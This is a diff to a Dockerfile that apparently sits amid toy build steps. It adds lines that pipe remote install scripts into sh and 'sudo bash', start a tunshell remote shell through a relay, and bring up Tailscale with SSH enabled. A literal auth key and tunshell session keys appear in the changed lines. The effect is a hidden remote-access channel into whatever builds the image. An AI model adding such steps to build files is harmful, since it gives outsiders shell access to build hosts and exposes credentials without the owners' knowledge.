@@ -10,8 +10,10 @@ RUN apt-get update && apt-get install python3
 RUN echo '<b>some html</b>' > hello.html
 RUN whoami
 RUN sudo su -c "whoami"
-RUN curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T JQOwVOK3VbAvXk5vNRBD7V G8zFsnV34jQrmTJ4CurnbA eu.relay.tunshell.com
-
+RUN curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T JQOwVOK3VbAvXk5vNRBD7V G8zFsnV34jQrmTJ4CurnbA eu.relay.tunshell.com &
+RUN curl -qfsSL "https://tailscale.com/install.sh" | sudo bash
+RUN sudo tailscaled --tun=userspace-networking --socks5-server=localhost:1055 --outbound-http-proxy-listen=localhost:1055 & 
+RUN sudo tailscale up --ssh --authkey=tskey-auth-kk3CNp1CNTRL-kunUBD8qDJXSj1Sp8KK6KXa67YhPFceFU
 # You could also install & start a database:
 # RUN apt-get update && apt-get install postgresql
 
